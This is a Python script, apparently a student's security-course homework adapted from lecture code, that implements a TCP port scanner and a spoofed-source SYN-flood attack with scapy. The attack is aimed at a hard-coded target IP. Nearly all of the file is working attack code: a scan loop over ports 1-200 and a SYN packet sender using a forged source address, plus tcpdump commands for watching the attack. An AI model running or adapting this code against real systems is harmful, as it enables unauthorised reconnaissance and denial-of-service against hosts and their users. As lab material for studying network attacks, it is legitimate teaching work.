#!/usr/bin/python3

# HW8
# Vivek Khanolkar
# vkhanolk
# 3/30/2021

import sys, socket
import re
import os.path

from scapy.all import * #use to create and send network packets

class TcpAttack:

    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
    
    def scanTarget(self, rangeStart, rangeEnd): # NOTE : code modified from Professor Avi Kak's Lecture 16 port_scan.py
        open_ports = []
        count = 0
        outFile = open('openports.txt', 'w')
        # Scan the ports in the specified range:
        for testport in range(rangeStart, rangeEnd+1):                               
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               
            sock.settimeout(0.1)                                                     
            try:                                                                     
                sock.connect( (self.targetIP, testport) )                                 
                open_ports.append(testport)                                                                                         
            except:   
                count = count + 1
                # print("port", count)                                                               
                pass #do nothing                              

        for x in open_ports:
            outFile.write("%s\n" % x)
        
        outFile.close()
     
    def attackTarget(self, port, numSyn): # NOTE : code modified from Professor Avi Kak's Lecture 16 DoS5.py                                            
        with open('openports.txt', 'r') as myFile:
            enc = myFile.readlines()

        inc = [int(x) for x in enc]

        # sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )  
        # flag = 0
        # try:
        #     sock.connect( (self.target, port) )
        #     flag = 1
        # except:
        #     pass #do nothing
        #if flag = 1:

        if port in inc:             #if our port is open 
            print("OPEN")
            for i in range(numSyn):                                                       
                IP_header = IP(src = self.spoofIP, dst = self.targetIP)                                
                TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)     
                packet = IP_header / TCP_header                                          
                try:                                                                     
                    send(packet)                                                          
                except:                                                   
                    pass    
            return 1
        else:
            return 0                                                           

#10.0.0.8 is machine i am attacking
#ON ATTACKER MACHINE (MINE): sudo tcpdump -vvv -nn -i wlan0 -s 1500 -S -X 'dst 128.46.4.84'

#10.0.0.19 is spoofed address of attacker
#ON THE ATTACKED MACHINE: sudo tcpdump -vvv -nn -i wlan0 -s 1500 -S -X 'src 123.12.1.12'
if __name__ == '__main__':
    spoofIP = '123.12.1.12' #address I am faking
    targetIP = '128.46.4.61' #address I am attacking
    rangeStart = 1
    rangeEnd = 200
    port = 110
    Tcp = TcpAttack(spoofIP, targetIP)
    Tcp.scanTarget(rangeStart, rangeEnd)
    if Tcp.attackTarget(port, 10):
        print('port was open to attack')
    else:
        print('port CLOSED, NOT open to attack')